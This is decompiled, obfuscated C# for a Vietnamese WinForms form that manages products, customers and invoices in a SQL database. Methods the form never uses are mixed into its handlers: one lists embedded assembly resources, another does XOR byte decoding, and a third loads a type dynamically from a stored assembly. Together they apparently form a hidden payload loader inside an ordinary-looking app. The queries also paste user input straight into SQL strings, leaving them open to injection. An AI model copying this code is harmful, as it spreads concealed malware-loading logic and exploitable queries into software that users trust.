using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Bj2x;
using Gw6e;
using Kf82;
using Microsoft.VisualBasic.CompilerServices;
using Nz6;
using Wr1g;
using i9P;

namespace j5L;

[DesignerGenerated]
public class Ze1 : Form
{
	private m6G9 dataaccess;

	private bool isloading;

	private IContainer components;

	[field: AccessedThroughProperty("dgvLoad")]
	internal virtual DataGridView dgvLoad
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnsanpham
	{
		[CompilerGenerated]
		get
		{
			return _btnsanpham;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = m0R;
			Button val = _btnsanpham;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnsanpham = value;
			val = _btnsanpham;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button btnkhachhang
	{
		[CompilerGenerated]
		get
		{
			return _btnkhachhang;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Yd6;
			Button val = _btnkhachhang;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnkhachhang = value;
			val = _btnkhachhang;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("GroupBox1")]
	internal virtual GroupBox GroupBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ComboBox cbSP
	{
		[CompilerGenerated]
		get
		{
			return _cbSP;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = z5P;
			ComboBox val = _cbSP;
			if (val != null)
			{
				val.remove_SelectedIndexChanged(eventHandler);
			}
			_cbSP = value;
			val = _cbSP;
			if (val != null)
			{
				val.add_SelectedIndexChanged(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("cbSearch")]
	internal virtual ComboBox cbSearch
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual TextBox txtSearch
	{
		[CompilerGenerated]
		get
		{
			return _txtSearch;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Pw4;
			TextBox val = _txtSearch;
			if (val != null)
			{
				((Control)val).remove_TextChanged(eventHandler);
			}
			_txtSearch = value;
			val = _txtSearch;
			if (val != null)
			{
				((Control)val).add_TextChanged(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("ContextMenuStrip1")]
	internal virtual ContextMenuStrip ContextMenuStrip1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnAddHD
	{
		[CompilerGenerated]
		get
		{
			return _btnAddHD;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = i3N;
			Button val = _btnAddHD;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnAddHD = value;
			val = _btnAddHD;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	internal virtual CheckBox cbKH
	{
		[CompilerGenerated]
		get
		{
			return _cbKH;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = x6K;
			CheckBox val = _cbKH;
			if (val != null)
			{
				val.remove_CheckedChanged(eventHandler);
			}
			_cbKH = value;
			val = _cbKH;
			if (val != null)
			{
				val.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual CheckBox cbHD
	{
		[CompilerGenerated]
		get
		{
			return _cbHD;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Tr7;
			CheckBox val = _cbHD;
			if (val != null)
			{
				val.remove_CheckedChanged(eventHandler);
			}
			_cbHD = value;
			val = _cbHD;
			if (val != null)
			{
				val.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual CheckBox cbCTHD
	{
		[CompilerGenerated]
		get
		{
			return _cbCTHD;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = r7H;
			CheckBox val = _cbCTHD;
			if (val != null)
			{
				val.remove_CheckedChanged(eventHandler);
			}
			_cbCTHD = value;
			val = _cbCTHD;
			if (val != null)
			{
				val.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual Button btnAddLSP
	{
		[CompilerGenerated]
		get
		{
			return _btnAddLSP;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = f1B;
			Button val = _btnAddLSP;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnAddLSP = value;
			val = _btnAddLSP;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button btnEditKH
	{
		[CompilerGenerated]
		get
		{
			return _btnEditKH;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = x4A;
			Button val = _btnEditKH;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnEditKH = value;
			val = _btnEditKH;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button btnXoa
	{
		[CompilerGenerated]
		get
		{
			return _btnXoa;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Mj9;
			Button val = _btnXoa;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnXoa = value;
			val = _btnXoa;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	public Ze1()
	{
		((Form)this).add_Load((EventHandler)Li4);
		dataaccess = new m6G9();
		isloading = false;
		Yf1();
	}

	private void Qp3()
	{
		string z9G = "SELECT MaLSP,TenLSP FROM dbo.LoaiSP";
		DataTable dataSource = dataaccess.e4L(z9G);
		cbSP.set_DataSource((object)dataSource);
		((ListControl)cbSP).set_ValueMember("MaLSP");
		((ListControl)cbSP).set_DisplayMember("TenLSP");
	}

	private void Tj8(string i1B)
	{
		string z9G = $"SELECT MaSP,TenSP,SL FROM dbo.SanPham WHERE MaLSP = '{i1B}'";
		DataTable dataSource = dataaccess.e4L(z9G);
		dgvLoad.set_DataSource((object)dataSource);
		DataGridView val = dgvLoad;
		val.get_Columns().get_Item(0).set_HeaderText("Ma SP");
		val.get_Columns().get_Item(0).set_HeaderText("Ten SP");
		val.get_Columns().get_Item(0).set_HeaderText("So Luong");
		val = null;
	}

	private void Li4(object sender, EventArgs e)
	{
		isloading = true;
		Qp3();
		Tj8(Conversions.ToString(((ListControl)cbSP).get_SelectedValue()));
		isloading = false;
	}

	private void z5P(object sender, EventArgs e)
	{
		if (!isloading)
		{
			Tj8(Conversions.ToString(((ListControl)cbSP).get_SelectedValue()));
		}
	}

	private void o9K(string Yt6, string Rf7)
	{
		string text = $"SELECT MaSP,TenSP,SL FROM dbo.SanPham WHERE MaLSP = '{Yt6}'";
		if (cbSearch.get_SelectedIndex() == 0)
		{
			text += $" AND MaSP LIKE '{Rf7}%'";
		}
		else if (cbSearch.get_SelectedIndex() == 1)
		{
			text += $" AND TenSP LIKE '{Rf7}%'";
		}
		DataTable dataSource = dataaccess.e4L(text);
		dgvLoad.set_DataSource((object)dataSource);
		DataGridView val = dgvLoad;
		val.get_Columns().get_Item(0).set_HeaderText("Ma SP");
		val.get_Columns().get_Item(0).set_HeaderText("Ten SP");
		val.get_Columns().get_Item(0).set_HeaderText("So Luong");
		val = null;
	}

	private void Pw4(object sender, EventArgs e)
	{
		o9K(Conversions.ToString(((ListControl)cbSP).get_SelectedValue()), txtSearch.get_Text());
	}

	private void Yd6(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		x0R x0R = new x0R();
		((Form)x0R).ShowDialog();
		if ((int)((Form)x0R).get_DialogResult() == 1)
		{
			Tj8(Conversions.ToString(((ListControl)cbSP).get_SelectedValue()));
		}
	}

	private void m0R(object sender, EventArgs e)
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Invalid comparison between Unknown and I4
		b8QK b8QK = new b8QK();
		b8QK.txtLoaisp.set_Text(Conversions.ToString(((ListControl)cbSP).get_SelectedValue()));
		((Form)b8QK).ShowDialog();
		if ((int)((Form)b8QK).get_DialogResult() == 1)
		{
			Tj8(Conversions.ToString(((ListControl)cbSP).get_SelectedValue()));
		}
	}

	private void x6K(object sender, EventArgs e)
	{
		string z9G = "SELECT MaKH,TenKH,Diachi,SoDT FROM dbo.KhachHang";
		DataTable dataSource = dataaccess.e4L(z9G);
		dgvLoad.set_DataSource((object)dataSource);
		DataGridView val = dgvLoad;
		val.get_Columns().get_Item(0).set_HeaderText("Ma KH");
		val.get_Columns().get_Item(0).set_HeaderText("Ten KH");
		val.get_Columns().get_Item(0).set_HeaderText("Dia Chi");
		val.get_Columns().get_Item(0).set_HeaderText("So DT");
		val = null;
	}

	private void Tr7(object sender, EventArgs e)
	{
		string z9G = "SELECT MaHD,MaKH,Ngaylap FROM dbo.HoaDon";
		DataTable dataSource = dataaccess.e4L(z9G);
		dgvLoad.set_DataSource((object)dataSource);
		DataGridView val = dgvLoad;
		val.get_Columns().get_Item(0).set_HeaderText("Ma HD");
		val.get_Columns().get_Item(0).set_HeaderText("Ma KH");
		val.get_Columns().get_Item(0).set_HeaderText("Ngay Lap");
		val = null;
	}

	private void r7H(object sender, EventArgs e)
	{
		string z9G = "SELECT MaSP,MaHD,SoLuong,DonGia FROM dbo.ChiTietHoaDon";
		DataTable dataSource = dataaccess.e4L(z9G);
		dgvLoad.set_DataSource((object)dataSource);
		DataGridView val = dgvLoad;
		val.get_Columns().get_Item(0).set_HeaderText("Ma SP");
		val.get_Columns().get_Item(0).set_HeaderText("Ma HD");
		val.get_Columns().get_Item(0).set_HeaderText("So Luong");
		val.get_Columns().get_Item(0).set_HeaderText("Don Gia");
		val = null;
	}

	internal static string[] b7P()
	{
		List<string> list = new List<string>();
		int num = 0;
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ((IEnumerable)NewLateBinding.LateGet(x4PY.mDic["Ass"], (Type)null, "GetManifestResourceNames", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
			while (enumerator.MoveNext())
			{
				object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
				list.Add(Conversions.ToString(objectValue));
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		checked
		{
			string[] array = new string[list.Count - 1 + 1];
			int num2 = array.Length - 1;
			for (num = 0; num <= num2; num++)
			{
				array[num] = list[num];
			}
			return array;
		}
	}

	private void i3N(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		Ra2 ra = new Ra2();
		((Form)ra).ShowDialog();
		if ((int)((Form)ra).get_DialogResult() == 1)
		{
			Tj8(Conversions.ToString(((ListControl)cbSP).get_SelectedValue()));
		}
	}

	private void f1B(object sender, EventArgs e)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		Ga5z ga5z = new Ga5z();
		((Form)ga5z).ShowDialog();
		if ((int)((Form)ga5z).get_DialogResult() == 1)
		{
			Tj8(Conversions.ToString(((ListControl)cbSP).get_SelectedValue()));
		}
	}

	internal static bool Fm0()
	{
		try
		{
			try
			{
				Type type = b8QK.Ht2j((Assembly)x4PY.mDic["Ass2"]);
				if (Operators.ConditionalCompareObjectEqual((object)type.Name, x4PY.mDic[x4PY.tName], false))
				{
					x4PY.mDic.Add(x4PY.T, type);
					return true;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	private void x4A(object sender, EventArgs e)
	{
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0105: Invalid comparison between Unknown and I4
		x4PY x4PY = new x4PY();
		DataGridView val = dgvLoad;
		x4PY.txtMakh.set_Text(Conversions.ToString(val.get_Rows().get_Item(val.get_CurrentCell().get_RowIndex()).get_Cells()
			.get_Item("MaKH")
			.get_Value()));
		x4PY.txtTenkh.set_Text(Conversions.ToString(val.get_Rows().get_Item(val.get_CurrentCell().get_RowIndex()).get_Cells()
			.get_Item("TenKH")
			.get_Value()));
		x4PY.txtDiachi.set_Text(Conversions.ToString(val.get_Rows().get_Item(val.get_CurrentCell().get_RowIndex()).get_Cells()
			.get_Item("Diachi")
			.get_Value()));
		x4PY.txtSdt.set_Text(Conversions.ToString(val.get_Rows().get_Item(val.get_CurrentCell().get_RowIndex()).get_Cells()
			.get_Item("SoDT")
			.get_Value()));
		val = null;
		((Form)x4PY).ShowDialog();
		if ((int)((Form)x4PY).get_DialogResult() == 1)
		{
			Tj8(Conversions.ToString(((ListControl)cbSP).get_SelectedValue()));
		}
	}

	public static byte d2A(byte f7S, byte[] c9F, int f8B, int Xc7)
	{
		f7S = (byte)(f7S ^ checked((byte)(c9F[unchecked(Xc7 % c9F.Length)] ^ ((Xc7 + unchecked(f8B % c9F.Length)) & f8B))));
		return f7S;
	}

	private void Mj9(object sender, EventArgs e)
	{
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0101: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		if (cbKH.get_Checked())
		{
			string arg = Conversions.ToString(dgvLoad.get_Rows().get_Item(dgvLoad.get_CurrentCell().get_RowIndex()).get_Cells()
				.get_Item("MaKH")
				.get_Value());
			string pp = $"DELETE KhachHang WHERE MaKH = '{arg}'";
			if (dataaccess.Jm7(pp))
			{
				MessageBox.Show("Xoa thanh cong");
				Tj8(Conversions.ToString(((ListControl)cbSP).get_SelectedValue()));
			}
			else
			{
				MessageBox.Show("Loi xoa");
			}
		}
		if (cbHD.get_Checked())
		{
			string arg2 = Conversions.ToString(dgvLoad.get_Rows().get_Item(dgvLoad.get_CurrentCell().get_RowIndex()).get_Cells()
				.get_Item("MaHD")
				.get_Value());
			string pp2 = $"DELETE HoaDon WHERE MaHD = '{arg2}'";
			if (dataaccess.Jm7(pp2))
			{
				MessageBox.Show("Xoa thanh cong");
				Tj8(Conversions.ToString(((ListControl)cbSP).get_SelectedValue()));
			}
			else
			{
				MessageBox.Show("Loi xoa");
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void w8P(bool q8A)
	{
		try
		{
			if (q8A && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(q8A);
		}
	}

	[DebuggerStepThrough]
	private void Yf1()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		components = new Container();
		dgvLoad = new DataGridView();
		btnsanpham = new Button();
		btnkhachhang = new Button();
		GroupBox1 = new GroupBox();
		cbSP = new ComboBox();
		Label1 = new Label();
		cbSearch = new ComboBox();
		txtSearch = new TextBox();
		ContextMenuStrip1 = new ContextMenuStrip(components);
		btnAddHD = new Button();
		cbKH = new CheckBox();
		cbHD = new CheckBox();
		cbCTHD = new CheckBox();
		btnAddLSP = new Button();
		btnEditKH = new Button();
		btnXoa = new Button();
		((ISupportInitialize)dgvLoad).BeginInit();
		((Control)GroupBox1).SuspendLayout();
		((Control)this).SuspendLayout();
		dgvLoad.set_AllowUserToAddRows(false);
		dgvLoad.set_AllowUserToDeleteRows(false);
		dgvLoad.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		((Control)dgvLoad).set_Location(new Point(12, 71));
		dgvLoad.set_MultiSelect(false);
		((Control)dgvLoad).set_Name("dgvLoad");
		dgvLoad.set_ReadOnly(true);
		dgvLoad.set_SelectionMode((DataGridViewSelectionMode)1);
		((Control)dgvLoad).set_Size(new Size(508, 308));
		((Control)dgvLoad).set_TabIndex(0);
		((Control)btnsanpham).set_Location(new Point(538, 97));
		((Control)btnsanpham).set_Name("btnsanpham");
		((Control)btnsanpham).set_Size(new Size(100, 23));
		((Control)btnsanpham).set_TabIndex(1);
		((ButtonBase)btnsanpham).set_Text("Them San Pham");
		((ButtonBase)btnsanpham).set_UseVisualStyleBackColor(true);
		((Control)btnkhachhang).set_Location(new Point(538, 39));
		((Control)btnkhachhang).set_Name("btnkhachhang");
		((Control)btnkhachhang).set_Size(new Size(100, 23));
		((Control)btnkhachhang).set_TabIndex(2);
		((ButtonBase)btnkhachhang).set_Text("Them KH");
		((ButtonBase)btnkhachhang).set_UseVisualStyleBackColor(true);
		((Control)GroupBox1).get_Controls().Add((Control)(object)cbSP);
		((Control)GroupBox1).set_Location(new Point(526, 279));
		((Control)GroupBox1).set_Name("GroupBox1");
		((Control)GroupBox1).set_Size(new Size(137, 100));
		((Control)GroupBox1).set_TabIndex(3);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("Loai San Pham");
		((ListControl)cbSP).set_FormattingEnabled(true);
		((Control)cbSP).set_Location(new Point(6, 38));
		((Control)cbSP).set_Name("cbSP");
		((Control)cbSP).set_Size(new Size(121, 21));
		((Control)cbSP).set_TabIndex(0);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Location(new Point(13, 39));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(49, 13));
		((Control)Label1).set_TabIndex(4);
		Label1.set_Text("T??m ki???m");
		((ListControl)cbSearch).set_FormattingEnabled(true);
		cbSearch.get_Items().AddRange(new object[2] { "MaSP", "TenSP" });
		((Control)cbSearch).set_Location(new Point(68, 36));
		((Control)cbSearch).set_Name("cbSearch");
		((Control)cbSearch).set_Size(new Size(109, 21));
		((Control)cbSearch).set_TabIndex(5);
		((Control)txtSearch).set_Location(new Point(184, 36));
		((Control)txtSearch).set_Name("txtSearch");
		((Control)txtSearch).set_Size(new Size(336, 20));
		((Control)txtSearch).set_TabIndex(6);
		((Control)ContextMenuStrip1).set_Name("ContextMenuStrip1");
		((Control)ContextMenuStrip1).set_Size(new Size(61, 4));
		((Control)btnAddHD).set_Location(new Point(538, 68));
		((Control)btnAddHD).set_Name("btnAddHD");
		((Control)btnAddHD).set_Size(new Size(100, 23));
		((Control)btnAddHD).set_TabIndex(10);
		((ButtonBase)btnAddHD).set_Text("Them Hoa Don");
		((ButtonBase)btnAddHD).set_UseVisualStyleBackColor(true);
		((ButtonBase)cbKH).set_AutoSize(true);
		((Control)cbKH).set_Location(new Point(538, 198));
		((Control)cbKH).set_Name("cbKH");
		((Control)cbKH).set_Size(new Size(86, 17));
		((Control)cbKH).set_TabIndex(12);
		((ButtonBase)cbKH).set_Text("Khach Hang");
		((ButtonBase)cbKH).set_UseVisualStyleBackColor(true);
		((ButtonBase)cbHD).set_AutoSize(true);
		((Control)cbHD).set_Location(new Point(538, 221));
		((Control)cbHD).set_Name("cbHD");
		((Control)cbHD).set_Size(new Size(69, 17));
		((Control)cbHD).set_TabIndex(13);
		((ButtonBase)cbHD).set_Text("Hoa Don");
		((ButtonBase)cbHD).set_UseVisualStyleBackColor(true);
		((ButtonBase)cbCTHD).set_AutoSize(true);
		((Control)cbCTHD).set_Location(new Point(538, 245));
		((Control)cbCTHD).set_Name("cbCTHD");
		((Control)cbCTHD).set_Size(new Size(108, 17));
		((Control)cbCTHD).set_TabIndex(14);
		((ButtonBase)cbCTHD).set_Text("Chi Tiet Hoa Don");
		((ButtonBase)cbCTHD).set_UseVisualStyleBackColor(true);
		((Control)btnAddLSP).set_Location(new Point(538, 126));
		((Control)btnAddLSP).set_Name("btnAddLSP");
		((Control)btnAddLSP).set_Size(new Size(100, 23));
		((Control)btnAddLSP).set_TabIndex(15);
		((ButtonBase)btnAddLSP).set_Text("Them Loai SP");
		((ButtonBase)btnAddLSP).set_UseVisualStyleBackColor(true);
		((Control)btnEditKH).set_Location(new Point(12, 394));
		((Control)btnEditKH).set_Name("btnEditKH");
		((Control)btnEditKH).set_Size(new Size(75, 23));
		((Control)btnEditKH).set_TabIndex(16);
		((ButtonBase)btnEditKH).set_Text("Sua KH");
		((ButtonBase)btnEditKH).set_UseVisualStyleBackColor(true);
		((Control)btnXoa).set_Location(new Point(102, 394));
		((Control)btnXoa).set_Name("btnXoa");
		((Control)btnXoa).set_Size(new Size(75, 23));
		((Control)btnXoa).set_TabIndex(17);
		((ButtonBase)btnXoa).set_Text("Xoa");
		((ButtonBase)btnXoa).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(675, 440));
		((Control)this).get_Controls().Add((Control)(object)btnXoa);
		((Control)this).get_Controls().Add((Control)(object)btnEditKH);
		((Control)this).get_Controls().Add((Control)(object)btnAddLSP);
		((Control)this).get_Controls().Add((Control)(object)cbCTHD);
		((Control)this).get_Controls().Add((Control)(object)cbHD);
		((Control)this).get_Controls().Add((Control)(object)cbKH);
		((Control)this).get_Controls().Add((Control)(object)btnAddHD);
		((Control)this).get_Controls().Add((Control)(object)txtSearch);
		((Control)this).get_Controls().Add((Control)(object)cbSearch);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)btnkhachhang);
		((Control)this).get_Controls().Add((Control)(object)btnsanpham);
		((Control)this).get_Controls().Add((Control)(object)dgvLoad);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((ISupportInitialize)dgvLoad).EndInit();
		((Control)GroupBox1).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
